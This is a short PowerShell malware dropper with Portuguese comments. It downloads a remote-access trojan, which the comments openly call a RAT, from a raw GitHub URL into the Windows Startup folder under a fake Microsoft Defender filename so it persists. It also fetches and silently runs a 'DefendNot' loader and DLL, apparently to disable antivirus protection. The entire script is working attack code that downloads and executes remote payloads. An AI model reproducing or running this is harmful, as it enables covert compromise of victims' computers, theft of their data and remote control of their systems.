# 1. Configurações e Variáveis
$urlBase = "https://raw.githubusercontent.com/thzinxa6/Instalation/refs/heads/main"
$tempPath = Join-Path $env:TEMP "MicrosoftDefenderCore"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$malFile = "$startupPath\MicrosoftWindowsDefender.exe"

# 2. Criação da pasta oculta
if (!(Test-Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath | Out-Null
}

# 3. Download do mal.exe (O RAT que pede .NET)
Invoke-WebRequest -Uri "$urlBase/mal.exe" -OutFile $malFile -ErrorAction SilentlyContinue

# 4. Download do DefendNot (Loader + DLL)
Invoke-WebRequest -Uri "$urlBase/defendnot-loader.exe" -OutFile "$tempPath\defendnot-loader.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "$urlBase/defendnot.dll" -OutFile "$tempPath\defendnot.dll" -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

# 5. Execução do mal.exe (SEM HIDDEN para disparar o alerta do .NET)
# Usamos Normal para que o Windows mostre a janela de "Recursos do Windows"
Start-Process -FilePath $malFile -WindowStyle Normal

# 6. Execução do DefendNot-Loader (TOTALMENTE OCULTO)
Start-Process -FilePath "$tempPath\defendnot-loader.exe" -ArgumentList "--silent" -WindowStyle Hidden
